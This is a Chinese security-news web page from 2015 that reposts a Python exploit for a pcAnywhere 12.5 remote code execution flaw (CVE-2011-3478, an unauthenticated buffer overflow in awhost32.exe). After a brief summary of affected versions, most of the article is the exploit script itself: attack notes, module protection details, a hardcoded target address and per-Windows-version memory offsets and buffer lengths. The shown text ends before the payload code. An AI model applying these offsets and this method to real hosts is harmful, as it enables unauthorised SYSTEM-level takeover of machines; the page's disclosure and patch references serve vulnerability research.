<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title> Windows x86平台上的Symantec pcAnywhere 12.5.0远程代码执行漏洞 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="Windows,平台,x86,Symantec,pcAnywhere,远程,代码,执行,漏洞"/>
    
        <meta name="description" content="awhost32.exe在处理连接进来的请求时,存在一个漏洞,当处理认证请求时,没有对客户的输入进行长度检查,导致远程非认证的攻击者能够利用此漏洞执行任意代码,默认权限是&#34;NT AUTHORITY\SYSTEM&#34; "/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2> Windows x86平台上的Symantec pcAnywhere 12.5.0远程代码执行漏洞</h2>
                <div class="article-msg">
                    <span class="time">2015-11-06 10:52:26</span>
                                        <span class="read">阅读：24483次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_2251"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="2251" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 360安全播报</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><span style="text-indent: 2em;"><img src="http://p5.qhimg.com/t010a961e76fc9112e6.png" title="t010a961e76fc9112e6.png" alt="http://p5.qhimg.com/t010a961e76fc9112e6.png"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em; font-size: 14px;">影响版本:<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">pcAnywhere v12.5.x 到 12.5.3<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Symantec IT Management Suite pcAnywhere Solution 7.0 (aka 12.5.x) and 7.1 (aka 12.6.x)<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">影响平台:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">windows x86<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"># &nbsp; &nbsp; &nbsp; - Windows 2000<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"># &nbsp; &nbsp; &nbsp; - Windows 2003 Server<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"># &nbsp; &nbsp; &nbsp; - Windows 2008 Server<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"># &nbsp; &nbsp; &nbsp; - Windows XP<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"># &nbsp; &nbsp; &nbsp; - Windows Vista<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"># &nbsp; &nbsp; &nbsp; - Windows 7<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">漏洞描述:<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">awhost32.exe在处理连接进来的请求时,存在一个漏洞,当处理认证请求时,没有对客户的输入进行长度检查,导致远程非认证的攻击者能够利用此漏洞执行任意代码,默认权限是&quot;NT AUTHORITY\SYSTEM&quot; <br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">限制：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">1、只能X86平台</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">2、要求能输入帐号密码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">3、无须认证码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">POC代码:<br/></span></p><p style="text-indent: 2em; text-align: left;"><a href="https://www.exploit-db.com/exploits/38599/" _src="https://www.exploit-db.com/exploits/38599/" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline; font-size: 14px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">https://www.exploit-db.com/exploits/38599/</span></a></p><pre class="brush:python;toolbar:false">#!/usr/bin/python
################################################################
#&nbsp;Exploit&nbsp;Title:&nbsp;Symantec&nbsp;pcAnywhere&nbsp;v12.5.0&nbsp;Windows&nbsp;x86&nbsp;RCE
#&nbsp;Date:&nbsp;2015-10-31
#&nbsp;Exploit&nbsp;Author:&nbsp;Tomislav&nbsp;Paskalev
#&nbsp;Vendor&nbsp;Homepage:&nbsp;https://www.symantec.com/
#&nbsp;Software&nbsp;Link:&nbsp;http://esdownload.symantec.com/akdlm/CD/MTV/pcAnywhere_12_5_MarketingTrialware.exe
#&nbsp;&nbsp;&nbsp;Version:&nbsp;Symantec&nbsp;pcAnywhere&nbsp;v12.5.0&nbsp;Build&nbsp;442&nbsp;(Trial)
#&nbsp;Vulnerable&nbsp;Software:
#&nbsp;&nbsp;&nbsp;Symantec&nbsp;pcAnywhere&nbsp;12.5.x&nbsp;through&nbsp;12.5.3
#&nbsp;&nbsp;&nbsp;Symantec&nbsp;IT&nbsp;Management&nbsp;Suite&nbsp;pcAnywhere&nbsp;Solution&nbsp;7.0&nbsp;(aka&nbsp;12.5.x)&nbsp;and&nbsp;7.1&nbsp;(aka&nbsp;12.6.x)
#&nbsp;Tested&nbsp;on:
#&nbsp;&nbsp;&nbsp;Symantec&nbsp;pcAnywhere&nbsp;v12.5.0&nbsp;Build&nbsp;442&nbsp;(Trial)
#&nbsp;&nbsp;&nbsp;--------------------------------------------
#&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Vista&nbsp;Ultimate&nbsp;SP1&nbsp;x86&nbsp;EN
#&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Vista&nbsp;Ultimate&nbsp;SP2&nbsp;x86&nbsp;EN
#&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;2008&nbsp;Enterprise&nbsp;SP2&nbsp;x86&nbsp;EN
#&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;7&nbsp;Professional&nbsp;SP1&nbsp;x86&nbsp;EN
#&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;7&nbsp;Ultimate&nbsp;SP1&nbsp;x86&nbsp;EN
#&nbsp;CVE&nbsp;ID:&nbsp;2011-3478
#&nbsp;OSVDB-ID:&nbsp;78532
################################################################
#&nbsp;Vulnerability&nbsp;description:
#&nbsp;&nbsp;&nbsp;The&nbsp;application&#39;s&nbsp;module&nbsp;used&nbsp;for&nbsp;handling&nbsp;incoming&nbsp;connections
#&nbsp;&nbsp;&nbsp;(awhost32.exe)&nbsp;contains&nbsp;a&nbsp;flaw.&nbsp;When&nbsp;handling&nbsp;authentication
#&nbsp;&nbsp;&nbsp;requests,&nbsp;the&nbsp;vulnerable&nbsp;process&nbsp;copies&nbsp;user&nbsp;provided&nbsp;input
#&nbsp;&nbsp;&nbsp;to&nbsp;a&nbsp;fixed&nbsp;length&nbsp;buffer&nbsp;without&nbsp;performing&nbsp;a&nbsp;length&nbsp;check.
#&nbsp;&nbsp;&nbsp;A&nbsp;remote&nbsp;unauthenticated&nbsp;attacker&nbsp;can&nbsp;exploit&nbsp;this&nbsp;vulnerability
#&nbsp;&nbsp;&nbsp;to&nbsp;cause&nbsp;a&nbsp;buffer&nbsp;overflow&nbsp;and&nbsp;execute&nbsp;arbitrary&nbsp;code&nbsp;in&nbsp;the
#&nbsp;&nbsp;&nbsp;context&nbsp;of&nbsp;the&nbsp;exploited&nbsp;application&nbsp;(installed&nbsp;as&nbsp;a&nbsp;service
#&nbsp;&nbsp;&nbsp;by&nbsp;default,&nbsp;i.e.&nbsp;with&nbsp;&quot;NT&nbsp;AUTHORITY\SYSTEM&quot;&nbsp;privileges).
################################################################
#&nbsp;Target&nbsp;application&nbsp;notes:
#&nbsp;&nbsp;&nbsp;-&nbsp;the&nbsp;application&nbsp;processes&nbsp;one&nbsp;login&nbsp;attempt&nbsp;at&nbsp;a&nbsp;time
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(i.e.&nbsp;multiple&nbsp;parallel&nbsp;login&nbsp;requests&nbsp;are&nbsp;not&nbsp;possible)
#&nbsp;&nbsp;&nbsp;-&nbsp;available&nbsp;modules&nbsp;(interesting&nbsp;exploit&nbsp;wise):
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;Rebase&nbsp;|&nbsp;SafeSEH&nbsp;|&nbsp;ASLR&nbsp;&nbsp;|&nbsp;NXCompat&nbsp;|&nbsp;OS&nbsp;Dll
#&nbsp;&nbsp;&nbsp;&nbsp;-------------------------------------------------------------
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;awhost32.exe&nbsp;|&nbsp;False&nbsp;&nbsp;|&nbsp;False&nbsp;&nbsp;&nbsp;|&nbsp;False&nbsp;|&nbsp;&nbsp;False&nbsp;&nbsp;&nbsp;|&nbsp;False
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ijl20.dll&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;False&nbsp;&nbsp;|&nbsp;False&nbsp;&nbsp;&nbsp;|&nbsp;False&nbsp;|&nbsp;&nbsp;False&nbsp;&nbsp;&nbsp;|&nbsp;False
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IMPLODE.DLL&nbsp;&nbsp;|&nbsp;False&nbsp;&nbsp;|&nbsp;False&nbsp;&nbsp;&nbsp;|&nbsp;False&nbsp;|&nbsp;&nbsp;False&nbsp;&nbsp;&nbsp;|&nbsp;False
#&nbsp;&nbsp;&nbsp;&nbsp;-------------------------------------------------------------
#&nbsp;&nbsp;&nbsp;-&nbsp;supported&nbsp;Windows&nbsp;x86&nbsp;operating&nbsp;systems&nbsp;(pcAnywhere&nbsp;v12.5)
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Windows&nbsp;2000
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Windows&nbsp;2003&nbsp;Server
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Windows&nbsp;2008&nbsp;Server
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Windows&nbsp;XP
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Windows&nbsp;Vista
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Windows&nbsp;7
################################################################
#&nbsp;Exploit&nbsp;notes:
#&nbsp;&nbsp;&nbsp;-&nbsp;bad&nbsp;characters:&nbsp;&quot;\x00&quot;
#&nbsp;&nbsp;&nbsp;-&nbsp;Windows&nbsp;Vista,&nbsp;Windows&nbsp;2008&nbsp;Server,&nbsp;Windows&nbsp;7
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;after&nbsp;a&nbsp;shellcode&nbsp;execution&nbsp;event&nbsp;occurs,&nbsp;the
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;application&nbsp;does&nbsp;not&nbsp;crash&nbsp;and&nbsp;remains&nbsp;fully&nbsp;functional
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;one&nbsp;successful&nbsp;shellcode&nbsp;execution&nbsp;event&nbsp;has&nbsp;a&nbsp;low
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;success&nbsp;rate&nbsp;(applies&nbsp;to&nbsp;all&nbsp;OSes)
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;in&nbsp;order&nbsp;to&nbsp;achieve&nbsp;an&nbsp;overall&nbsp;more&nbsp;reliable&nbsp;exploit,
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;multiple&nbsp;shellcode&nbsp;executions&nbsp;need&nbsp;to&nbsp;be&nbsp;performed
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(until&nbsp;the&nbsp;shellcode&nbsp;is&nbsp;successfully&nbsp;executed)
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;brute&nbsp;force&nbsp;is&nbsp;a&nbsp;feasible&nbsp;method&nbsp;
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;multiple&nbsp;parallel&nbsp;brute&nbsp;force&nbsp;attacks&nbsp;are&nbsp;not&nbsp;possible
#&nbsp;&nbsp;&nbsp;-&nbsp;multiple&nbsp;valid&nbsp;offsets&nbsp;are&nbsp;available&nbsp;(i.e.&nbsp;not&nbsp;just&nbsp;the
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ones&nbsp;tested)
################################################################
#&nbsp;Test&nbsp;notes:
#&nbsp;&nbsp;&nbsp;-&nbsp;all&nbsp;tested&nbsp;OSes
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;clean&nbsp;default&nbsp;installations
#&nbsp;&nbsp;&nbsp;-&nbsp;all&nbsp;OS&nbsp;specific&nbsp;statistics&nbsp;referenced&nbsp;in&nbsp;the&nbsp;exploit&nbsp;are
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;based&nbsp;on&nbsp;the&nbsp;test&nbsp;results&nbsp;of&nbsp;10&nbsp;attempts&nbsp;per&nbsp;tested&nbsp;offset
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;all&nbsp;attempts&nbsp;were&nbsp;performed&nbsp;after&nbsp;a&nbsp;system&nbsp;reboot&nbsp;(VM)
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;the&nbsp;provided&nbsp;test&nbsp;results&nbsp;should&nbsp;be&nbsp;taken&nbsp;only&nbsp;as&nbsp;a&nbsp;rough&nbsp;guide
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;in&nbsp;practice&nbsp;it&nbsp;might&nbsp;occur&nbsp;that&nbsp;the&nbsp;number&nbsp;of&nbsp;attempts
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;needed&nbsp;to&nbsp;achieve&nbsp;successful&nbsp;exploitation&nbsp;is&nbsp;(much)
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;higher&nbsp;than&nbsp;the&nbsp;maximum&nbsp;value&nbsp;contained&nbsp;in&nbsp;the&nbsp;test
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;results,&nbsp;or&nbsp;that&nbsp;the&nbsp;exploit&nbsp;does&nbsp;not&nbsp;succeed&nbsp;at&nbsp;all
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;other&nbsp;(untested)&nbsp;offsets&nbsp;might&nbsp;provide&nbsp;better&nbsp;results
#&nbsp;&nbsp;&nbsp;-&nbsp;not&nbsp;letting&nbsp;the&nbsp;OS&nbsp;and&nbsp;application&nbsp;load&nbsp;fully/properly&nbsp;before
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;starting&nbsp;the&nbsp;exploit&nbsp;may&nbsp;lead&nbsp;to&nbsp;failed&nbsp;exploitation&nbsp;(this
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;observation&nbsp;was&nbsp;made&nbsp;during&nbsp;the&nbsp;testing&nbsp;of&nbsp;the&nbsp;exploit&nbsp;and
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;applies&nbsp;mostly&nbsp;to&nbsp;Windows&nbsp;7)
################################################################
#&nbsp;Patch:
#&nbsp;&nbsp;&nbsp;https://support.symantec.com/en_US/article.TECH179526.html
#&nbsp;&nbsp;&nbsp;https://support.norton.com/sp/en/us/home/current/solutions/v78694006_EndUserProfile_en_us
################################################################
#&nbsp;Thanks&nbsp;to:
#&nbsp;&nbsp;&nbsp;Tal&nbsp;zeltzer&nbsp;(discovered&nbsp;the&nbsp;vulnerability)
#&nbsp;&nbsp;&nbsp;S2&nbsp;Crew&nbsp;(Python&nbsp;PoC)
################################################################
#&nbsp;In&nbsp;memoriam:
#&nbsp;&nbsp;&nbsp;msfpayload&nbsp;|&nbsp;msfencode&nbsp;&nbsp;[2005&nbsp;-&nbsp;2015]
################################################################
#&nbsp;References:
#&nbsp;&nbsp;&nbsp;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3478
#&nbsp;&nbsp;&nbsp;http://www.zerodayinitiative.com/advisories/ZDI-12-018/
#&nbsp;&nbsp;&nbsp;https://www.exploit-db.com/exploits/19407/
################################################################
import&nbsp;socket
import&nbsp;time
import&nbsp;struct
import&nbsp;string
import&nbsp;sys
################################
###&nbsp;&nbsp;HARDCODED&nbsp;TARGET&nbsp;INFO&nbsp;&nbsp;&nbsp;###
################################
#&nbsp;target&nbsp;server&nbsp;info
#&nbsp;&gt;&gt;&gt;&nbsp;MODIFY&nbsp;THIS&nbsp;&gt;&gt;&gt;
targetServer&nbsp;=&nbsp;&quot;192.168.80.227&quot;
targetPort&nbsp;&nbsp;&nbsp;=&nbsp;5631
#&nbsp;Supported&nbsp;operating&nbsp;systems
vistaUltSP1&nbsp;&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Version&#39;:&nbsp;&#39;Microsoft&nbsp;Windows&nbsp;Vista&nbsp;Ultimate&nbsp;SP1&nbsp;x86&nbsp;EN&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Offset&#39;:&nbsp;0x03e60000,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;PasswordStringLength&#39;:&nbsp;3500,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;TestAttempts&#39;:&nbsp;[8,&nbsp;62,&nbsp;35,&nbsp;13,&nbsp;8,&nbsp;7,&nbsp;11,&nbsp;23,&nbsp;8,&nbsp;10]
};
vistaUltSP2&nbsp;&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Version&#39;:&nbsp;&#39;Microsoft&nbsp;Windows&nbsp;Vista&nbsp;Ultimate&nbsp;SP2&nbsp;x86&nbsp;EN&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Offset&#39;:&nbsp;0x03e60000,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;PasswordStringLength&#39;:&nbsp;3500,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;TestAttempts&#39;:&nbsp;[16,&nbsp;27,&nbsp;13,&nbsp;17,&nbsp;4,&nbsp;13,&nbsp;7,&nbsp;9,&nbsp;5,&nbsp;16]
};
s2k8EntSP2&nbsp;&nbsp;&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Version&#39;:&nbsp;&#39;Microsoft&nbsp;Windows&nbsp;2008&nbsp;Enterprise&nbsp;SP2&nbsp;x86&nbsp;EN&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Offset&#39;:&nbsp;0x03dd0000,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;PasswordStringLength&#39;:&nbsp;3500,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;TestAttempts&#39;:&nbsp;[25,&nbsp;5,&nbsp;14,&nbsp;18,&nbsp;66,&nbsp;7,&nbsp;8,&nbsp;4,&nbsp;4,&nbsp;24]
};
sevenProSP1&nbsp;&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Version&#39;:&nbsp;&#39;Microsoft&nbsp;Windows&nbsp;7&nbsp;Professional&nbsp;SP1&nbsp;x86&nbsp;EN&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Offset&#39;:&nbsp;0x03a70000,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;PasswordStringLength&#39;:&nbsp;3500,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;TestAttempts&#39;:&nbsp;[188,&nbsp;65,&nbsp;25,&nbsp;191,&nbsp;268,&nbsp;61,&nbsp;127,&nbsp;136,&nbsp;18,&nbsp;98]
};
